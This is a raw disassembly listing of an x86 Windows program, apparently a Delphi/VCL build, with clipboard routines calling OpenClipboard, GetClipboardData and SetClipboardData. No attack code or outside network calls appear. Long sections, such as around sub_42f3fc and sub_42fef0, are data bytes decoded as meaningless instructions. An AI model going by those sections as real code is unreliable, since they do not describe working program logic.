je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x212 ] 0x0
je r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ esi + 0x38 ]
mov [ edi + 0x218 ] eax
mov dl 0x1
call sub_44031c
mov ebx [ edi + 0x218 ]
mov dx [ ebx + 0x44 ]
mov ax [ ebx + 0x40 ]
call sub_406c74
push eax
push 0x1
push 0x201
mov eax edi
call sub_446450
push eax
call PostMessageA
sub_42f01c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
mov ecx [ ebp - 0x4 ]
mov eax esi
call sub_444f24
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov [ ebx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
sub_42f084
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_42f0e0
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x22c ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_457570
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_446754
test al al
je r-xdata
cmp [ ebp + 0x224 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_446450
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_440d98
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42f178
push ebx
mov ebx eax
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x0
jne r-xdata
mov eax ebx
call sub_42f0e0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
sub_42f1b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445b64
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x218 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_42e7e8
cmp [ ebx + 0x5c ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x218 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffee
call sub_403368
sub_42f208
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
mov al 0x1
movsx ecx [ esi + 0xa ]
movsx edx [ esi + 0x8 ]
mov eax ebx
call sub_42ea54
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42f23c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_422a70
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_4221f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_422314
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4225d0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_444820
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_42f39d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x224 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] 0x1
xor eax eax
push ebp
push sub_42f365
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_424dc8
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
pop edx
mov ecx edx
cdq
idiv ecx
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f36c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x9 ]
mov [ eax + 0x224 ] dl
retn
inc eax
mov [ ebp - 0x10 ] eax
xor edi edi
inc edi
dec [ ebp - 0x10 ]
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_424de0
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
pop edx
mov ecx edx
cdq
idiv ecx
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_424de0
imul esi
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_424dc8
mov edx eax
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
pop ecx
call sub_4224f0
inc esi
dec ebx
jne r-xdata
sub_42f36c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_422a70
sub_42f3fc
xchg esi eax
dec eax
add [ edi + edi * 8 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] dl
xchg esi eax
dec eax
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] bl
xchg esi eax
dec eax
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] al
xchg esi eax
dec eax
add [ esi ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] cl
xchg esi eax
dec eax
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah bl
jns r-xdata
add [ esi * 8 + 0x798c0042 ] ah
dec eax
add [ ebp + esi * 8 + 0x42 ] ch
add ah dl
jns r-xdata
add [ esi * 8 + 0x79840042 ] bl
dec eax
add [ ebp + esi * 8 + 0x42 ] ah
add ah cl
jns r-xdata
add [ esi * 8 + 0x797c0042 ] dl
dec eax
add [ ebp + esi * 8 + 0x42 ] bl
add ah al
jns r-xdata
add [ esi * 8 + 0x79740042 ] cl
dec eax
add [ esi * 8 + 0x796c0042 ] al
dec eax
add ah bh
hlt
add [ ebp + esi * 8 + 0x42 ] dl
add [ ecx + edi * 2 - 0xab3ffb8 ] bh
inc edx
add [ ecx + edi * 2 - 0xabbffb8 ] dh
inc edx
add [ ecx + edi * 2 - 0xac3ffb8 ] ch
inc edx
add [ ecx + edi * 2 - 0xacbffb8 ] ah
inc edx
add [ ecx + edi * 2 - 0xad3ffb8 ] bl
inc edx
add [ ecx + edi * 2 - 0xadbffb8 ] dl
inc edx
add [ ecx + edi * 2 - 0xae3ffb8 ] cl
inc edx
add [ ecx + edi * 2 - 0xaebffb8 ] al
inc edx
add [ ecx + edi * 2 + 0x48 ] bh
sub_42f768
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f78d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f794
retn
sub_42f7a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
clc
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x59 ] dl
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebp + edi * 8 + 0x42 ] dh
add [ ebx + edi * 8 ] bh
inc edx
add [ ebp + eax * 4 - 0x353ffbf ] dl
inc edx
add [ eax ] ah
stc
inc edx
add [ eax ] bh
clc
inc edx
add [ eax - 0x3bffbd08 ] bl
clc
inc edx
add [ edx ] cl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
sbb al bh
inc edx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
in al dx
test [ edx ] r-xdata
add [ eax ] al
pop es
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42f870
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f877
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42f898
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41f8d8
sub_42f8c4
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_42fd18
call sub_41f824
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_42f920
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42f940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42f9b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_403f40
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_404138
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f9b9
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_42f9c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42fa62
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_424a9c
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4249ac
call sub_4039a4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fa70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42fac8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42facf
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42fad8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42fb2d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb34
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42fb3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42f9c0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42fa70
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41858c
mov edx ebx
mov eax esi
call sub_42fad8
jmp r-xdata
pop esi
pop ebx
retn
sub_42fba4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42fc19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42f87c
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_424a70
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc20
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_42fc28
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42fc9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42f87c
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fca4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_42fcac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42fba4
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4184a8
mov edx ebx
mov eax esi
call sub_42fc28
jmp r-xdata
pop esi
pop ebx
retn
sub_42fd18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42fd42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fd47
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403920
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fd74
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42fda8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fdd9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fde0
retn
mov eax [ rw-data ]
call sub_40316c
sub_42fef0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xff
inc edx
add [ eax + eax ] ah
add [ eax ] al
sub [ edi + 0x33b40043 ] ah
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
inc ecx
add [ esi + edx + 0x43 ] bh
add [ eax - 0x11 ] ch
inc ecx
add [ ebx + ebp * 8 ] dl
inc ebx
add [ edi + ebp * 8 - 0x143fffbf ] bl
inc ebx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
inc ecx
add [ eax ] al
0x16a00043 0x43
sub_42ff62
inc ebx
add ah ch
push ss
inc ebx
add [ eax + eax * 8 ] cl
inc esp
add ah ch
jmp r-xdata
inc ebx
add [ esi ] dl
push esp
push ebx
jo r-xdata
inc esp
add [ eax - 0xfffbe7c ] ch
sbb al 0x43
add [ eax - 0x13ffbc10 ] al
out dx eax
inc ebx
inc edx
jne r-xdata
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ edi + edx + 0x43 ] bl
add [ eax + 0xb ] ch
inc esp
add [ ebx + ecx + 0x44 ] ah
add [ esp + ecx ] dh
inc esp
add ah dh
out dx al
inc ebx
add [ eax ] bh
test [ ebx ] 0x9c
cmc
inc ebx
add ah al
inc [ ebx ]
cmp al 0xee
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add [ esi + ecx + 0x44 ] ah
add [ eax ] ah
pop ds
inc esp
add [ eax + eax + 0xf80044 ] al
inc esp
add [ ecx + esi * 8 + 0x43 ] ch
add al bl
add [ eax + eax + 0x54 ] al
sbb [ ebx ] al
adc [ eax ] al
add eax [ edx ]
or al 0xb0
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
inc ebx
add [ eax - 0x12 ] ah
je r-xdata
add [ eax + 0x600043f9 ] bl
out dx al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43001890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xa004300 ] ch
add [ ebx ] eax
test [ ecx ] al
add [ eax ] al
sbb [ ebp - 0x11b7ffbd ] bh
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
clc
cmove eax [ eax ]
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x18
inc ebx
add al bl
sbb al 0x44
add al dl
adc [ eax + eax - 0x58 ] al
test [ ecx ] al
sub_4300c8
jmp r-xdata
call [ ecx ]
inc ebx
add [ ecx ] dh
inc ebx
add [ eax + 0x21 ] ch
inc ebx
add al bl
and [ ebx ] eax
jo r-xdata
je r-xdata
inc ebx
add [ eax + 0x22 ] bh
inc ebx
add [ eax - 0x5bffbcde ] al
and al [ ebx ]
sbb [ ebx ] ah
inc ebx
add [ eax ] dl
and al 0x43
add [ eax ] ch
pop ds
inc ebx
add [ edi + ebx ] dl
inc ebx
add [ ebx + 0x1d740043 ] bl
or al 0x54
push ebx
jo r-xdata
inc ebx
add [ esi + ebx ] dl
inc ebx
add [ edi + ebx ] cl
inc ebx
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
inc edx
jne r-xdata
add [ ecx ] ah
inc edx
jne r-xdata
inc edx
insb
insb
push ebp
jo r-xdata
inc ebx
add [ eax + 0x43ef ] ah
add [ eax ] al
add [ ebx ] 0x0
popad
add [ eax ] al
inc [ edi + ebp * 8 ]
je r-xdata
add [ eax ] eax
je r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ 0x6e410700 ] cl
je r-xdata
add bh bh
pop eax
and [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add al 0xef
test eax r--data
outsb
nop
sbb al 0x1
inc ebx
add [ edi ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax ] al
or eax 0x6e410700
add eax [ eax ]
outsb
sbb [ eax ] al
inc ebx
add [ esi + edi * 4 ] cl
inc ebx
add [ edi ] ah
add [ edi ] al
inc edx
jne r-xdata
cmp al 0x20
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
dec ecx
outsb
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
stosb [ edi ]
inc ebx
add [ eax + eax ] dh
add dh bh
aam 0xfc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
add bh bh
jo r-xdata
je r-xdata
add [ eax ] al
adc [ 0x6f460400 ] 0x6e
je r-xdata
add al [ edx ]
push 0xa4ff0000
cld
inc ebx
add [ esp + edi * 8 + 0x43 ] dh
add [ eax - 0x80000000 ] al
adc eax 0x6f460400
outsb
adc [ eax ] al
jo r-xdata
add [ edi ] bl
outsb
jae r-xdata
add [ eax ] eax
or eax [ edx ]
xor [ edi ] bl
inc ebx
add [ edi + ebx ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
dec esp
pop ds
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
